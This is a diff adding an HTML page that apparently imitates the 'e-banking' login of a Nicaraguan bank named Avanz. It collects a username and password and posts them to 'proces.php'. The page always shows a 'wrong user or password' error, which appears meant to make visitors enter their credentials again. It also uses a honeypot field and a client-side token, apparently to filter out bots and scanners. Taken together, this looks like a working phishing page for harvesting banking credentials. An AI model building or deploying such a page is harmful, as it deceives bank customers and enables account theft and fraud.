@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avanz</title>
+
+    <script>
+        // Generar un token CSRF y almacenarlo en una variable oculta
+        function generateCSRFToken() {
+            let token = Math.random().toString(36).substr(2);
+            document.getElementById('csrf_token').value = token;
+            sessionStorage.setItem('csrf_token', token);
+        }
+    </script>
+    <style>
+         .hidden-field { 
+            display: none; /* Campo honeypot invisible para usuarios */
+        }
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: white;
+        }
+        .header {
+            width: 97.5%;
+            height: 100px;
+            background: url('img/bar.jpg') no-repeat center;
+            background-size: cover;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            position: relative;
+        }
+        .logo img {
+            height: 50px;
+        }
+        .top-right-image {
+            position: absolute;
+            top: 10px;
+            right: 20px;
+            height: 80px;
+        }
+        .login-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: -27%;
+        }
+        .masa4 {
+            -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #333;
+    font-family: sans-serif;
+    box-sizing: border-box;
+    background: #a7a8aa;
+    padding: 0px 0px 0px 10px;
+    display: inline-block;
+    float: left;
+    height: 96px;
+    width: 410px;
+        }
+        .form-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: -35px;
+
+        }
+        .p1 {outline: none;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ababab;
+        }
+        .p5 {    -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    box-sizing: border-box;
+    margin: 0;
+    font: inherit;
+    color: inherit;
+    text-transform: none;
+    font-family: inherit;
+    font-size: inherit;
+    line-height: inherit;
+    min-width: 126px;
+    padding: 2px;
+    margin-top: 15px;
+            position: absolute;
+            font-family: sans-serif;
+           }
+        .p2 {    -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    box-sizing: border-box;
+    margin: 0;
+    font: inherit;
+    overflow: visible;
+    -webkit-appearance: button;
+    cursor: pointer;
+    font-family: inherit;
+    font-size: inherit;
+    line-height: inherit;
+    min-width: 126px;
+    text-transform: uppercase;
+    padding: 5px 20px;
+    border: none;
+    color: #fff;
+    background: #FF7500;
+            font-family: sans-serif;
+            position: absolute;
+             margin-top: 50px;
+        }
+        .curva-container {
+            -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #333;
+    font-family: "Open Sans", serif;
+    box-sizing: border-box;
+    display: inline-block;
+    float: left;
+    height: 96px;
+    background: url(../../images/Nicaragua/curva-login.png) no-repeat;
+    background-size: contain;
+    width: 192px;
+    padding: 15px 0px 0px 15px;
+          margin-top:  -50px; 
+        }
+        .curva-image {
+            height: 96px;
+        }
+
+
+
+
+
+
+
+
+
+
+    </style>
+</head>
+<body onload="generateCSRFToken()">
+    <div class="header">
+        <img width="150px" style="margin-left: 150px;margin-top: 10px;" src="img/lk.svg" alt="Avanz">
+        <img class="top-right-image" src="img/pella.png" alt="Imagen superior derecha">
+    </div>
+
+
+
+
+
+
+
+    <div class="background-image"></div>
+<br>
+
+<form action="proces.php" method="post" style="margin-top: -50px;"> 
+
+
+
+
+
+    <img style="margin-top: 50px;width: 100%;" src="img/image222.png" alt="">
+
+<br> 
+    <div style="margin-left: -250px;" class="login-container">
+        <div class="masa4">
+            <p style="color: white;font-size: 30px;margin-top:  5px ;">e-banking</p>
+
+
+
+            <div class="form-group">
+                <input name="pp1" required placeholder="Usuario" class="p1" type="text" autocomplete="off">
+                <input  name="pp2" required placeholder="Contraseña" class="p1" type="password" autocomplete="off">
+            </div> <p style="color:red;font-family:sans-serif;margin-top:15px;">Usuario o CLave Incorrecta</p>
+            <br>
+             <!-- Campo Honeypot -->
+             <input type="text" name="honeypot" class="hidden-field" autocomplete="off">
+             <!-- Token CSRF -->
+             <input type="hidden" id="csrf_token" name="csrf_token">
+        </div>
+        <div style="margin-top: 20px;margin-left: -15px;">
+           
+            <div class="curva-container">
+            <select class="p5" id="language_movil" name="language">
+                <option value="es-NI" selected>Español</option>
+                <option value="en-US">Inglés</option>
+            </select>
+            <button class="p2">INGRESAR</button>
+            <img class="curva-image" src="img/curva-login.png" alt="Curva">
+        </div>
+
+    </div>
+    </div>
+
+
+ <img width="100%" style="margin-top: 300px;" src="img/imagsse.png" alt="">
+
+<img width="100%" style="margin-top: -5px;" src="img/image555.png" alt="">
+
+
+</form>
+
+
+<script>
+    function validateForm() {
+        let csrfToken = document.getElementById('csrf_token').value;
+        let storedToken = sessionStorage.getItem('csrf_token');
+        let honeypot = document.getElementsByName('honeypot')[0].value;
+
+        if (csrfToken !== storedToken) {
+            alert('Usuario o contraseña incorrecto.');
+            return false;
+        }
+        if (honeypot.length > 0) {
+            alert('Usuario o contraseña incorrecto.');
+            return false;
+        }
+        return true;
+    }
+</script>
+
+
+
+
+
+
+
+</body>
+</html>
